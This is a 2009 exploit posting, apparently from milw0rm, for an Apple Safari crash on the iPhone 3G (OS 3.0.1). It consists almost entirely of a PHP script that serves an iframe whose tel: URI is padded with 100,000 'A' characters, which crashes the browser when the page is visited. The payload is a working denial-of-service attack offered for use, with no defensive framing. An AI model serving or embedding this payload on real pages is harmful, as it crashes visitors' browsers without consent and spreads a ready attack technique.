# Apple Safari Iphone Crash using tel:
# Found by cloud : cloud[at]madpowah[dot]org
# http://blog.madpowah.org

# Tested on Iphone 3G, OS 3.0.1
# Launch Safari, enter the page and after a few seconds Safari will crash and black screen will appear

# Exploit:

<?php
set_time_limit(0);
$var = "";
for ($i=0; $i<100000; $i++){
       $var = $var . "A";
}
echo '<iframe src="tel:' . $var .'"></iframe>';
?> 

# milw0rm.com [2009-09-14]
